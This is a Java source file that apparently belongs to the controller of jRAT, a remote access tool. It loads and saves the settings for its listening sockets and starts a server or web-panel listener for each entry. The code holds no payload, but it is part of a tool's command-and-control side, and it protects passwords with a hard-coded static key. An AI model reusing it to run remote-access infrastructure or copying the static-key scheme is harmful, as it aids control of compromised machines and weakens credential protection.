package io.jrat.controller.settings;

import io.jrat.common.crypto.Crypto;
import io.jrat.common.crypto.KeyUtils;
import io.jrat.controller.Globals;
import io.jrat.controller.exceptions.InvalidSocketTypeException;
import io.jrat.controller.net.PortListener;
import io.jrat.controller.net.ServerListener;
import io.jrat.controller.webpanel.WebPanelListener;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.io.Serializable;
import java.net.BindException;

import javax.swing.JOptionPane;

public class SettingsSockets extends AbstractStoreable implements Serializable {

	private static final long serialVersionUID = -4638162646507652405L;

	private static final SettingsSockets instance = new SettingsSockets();

	public static SettingsSockets getGlobal() {
		return instance;
	}

	@Override
	public void load() throws Exception {
		BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(getFile())));
		
		reader.readLine();
		int len = Integer.parseInt(reader.readLine());
		
		for (int i = 0; i < len; i++) {
			String name = reader.readLine();
			int port = Integer.parseInt(reader.readLine());
			int timeout = Integer.parseInt(reader.readLine());
			int type = Integer.parseInt(reader.readLine());
			String pass = Crypto.decrypt(reader.readLine(), KeyUtils.STATIC_KEY.getEncoded());
			
			SocketEntry se = new SocketEntry(name, port, timeout, pass, type);
			se.start();
		}
		
		
		reader.close();
	}

	@Override
	public void save() throws Exception {
		PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(getFile())));
		
		pw.println("Sockets configuration");
		pw.println(PortListener.listeners.size());
		
		for (int i = 0; i < PortListener.listeners.size(); i++) {
			PortListener pl = PortListener.listeners.get(i);
			pw.println(pl.getName());
			pw.println(pl.getPort());
			pw.println(pl.getTimeout());
			pw.println(pl.getType());
			pw.println(Crypto.encrypt(pl.getPass(), KeyUtils.STATIC_KEY.getEncoded()));
		}
		
		pw.close();
	}

	public class SocketEntry implements Serializable {

		private static final long serialVersionUID = -2000514812654090252L;

		private int type;
		private String pass;
		private int timeout;
		private int port;
		private String name;

		public SocketEntry(String name, int port, int timeout, String pass, int type) {
			this.name = name;
			this.port = port;
			this.timeout = timeout;
			this.pass = pass;
			this.type = type;
		}

		public String getPass() {
			return pass;
		}

		public int getTimeout() {
			return timeout;
		}

		public int getPort() {
			return port;
		}

		public String getName() {
			return name;
		}
		
		public int getType() {
			return type;
		}

		public void start() {
			try {
				if (type == SocketType.NORMAL_SOCKET) {
					ServerListener connection = new ServerListener(name, port, timeout, pass);
					connection.start();
				} else if (type == SocketType.WEB_PANEL_SOCKET) {
					WebPanelListener wpl = new WebPanelListener(name, port, pass);
					wpl.start();
				} else {
					throw new InvalidSocketTypeException();
				}
			} catch (BindException e) {
				JOptionPane.showMessageDialog(null, "Port " + port + " is already in use", "jRAT", JOptionPane.ERROR_MESSAGE);
				e.printStackTrace();
			} catch (Exception e) {
				e.printStackTrace();
			}
		}

	}
	
	public class SocketType {
		public static final int NORMAL_SOCKET = 0;
		public static final int WEB_PANEL_SOCKET = 1;
	}

	@Override
	public File getFile() {
		return new File(Globals.getSettingsDirectory(), ".sockets");
	}

}
